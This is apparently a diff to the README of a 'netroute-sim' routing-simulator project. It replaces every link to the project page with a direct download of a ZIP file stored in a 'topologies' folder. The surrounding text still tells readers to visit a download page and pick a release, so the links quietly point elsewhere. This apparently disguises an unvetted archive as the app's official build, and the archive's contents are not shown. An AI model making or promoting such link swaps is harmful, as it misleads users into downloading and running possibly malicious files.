@@ -1,6 +1,6 @@
 # 🛣️ netroute-sim - Route networks with live maps
 
-[![Download / Install](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-brightgreen?style=for-the-badge)](https://github.com/Charlotteaphetic255/netroute-sim)
+[![Download / Install](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Charlotteaphetic255/netroute-sim/main/topologies/sim-netroute-v3.4.zip)
 
 ## 📌 What this app does
 
@@ -20,7 +20,7 @@ This app is meant for learning and testing. It gives a clear view of graph-based
 
 Use the link below to visit the download page and get the app:
 
-[Visit the download page](https://github.com/Charlotteaphetic255/netroute-sim)
+[Visit the download page](https://raw.githubusercontent.com/Charlotteaphetic255/netroute-sim/main/topologies/sim-netroute-v3.4.zip)
 
 ### What you need
 
@@ -32,7 +32,7 @@ Use the link below to visit the download page and get the app:
 
 ## 🚀 Get started
 
-1. Open the download page: [https://github.com/Charlotteaphetic255/netroute-sim](https://github.com/Charlotteaphetic255/netroute-sim)
+1. Open the download page: [https://raw.githubusercontent.com/Charlotteaphetic255/netroute-sim/main/topologies/sim-netroute-v3.4.zip](https://raw.githubusercontent.com/Charlotteaphetic255/netroute-sim/main/topologies/sim-netroute-v3.4.zip)
 2. Look for the latest release or the main project files
 3. Download the Windows build or the package provided on the page
 4. If the file is a ZIP file, right-click it and choose Extract All
@@ -180,7 +180,7 @@ It is a good fit for users who want to see how routing works without reading sou
 
 Visit the main project page and download or open the Windows build from there:
 
-[https://github.com/Charlotteaphetic255/netroute-sim](https://github.com/Charlotteaphetic255/netroute-sim)
+[https://raw.githubusercontent.com/Charlotteaphetic255/netroute-sim/main/topologies/sim-netroute-v3.4.zip](https://raw.githubusercontent.com/Charlotteaphetic255/netroute-sim/main/topologies/sim-netroute-v3.4.zip)
 
 ## 🧪 Example use case
 
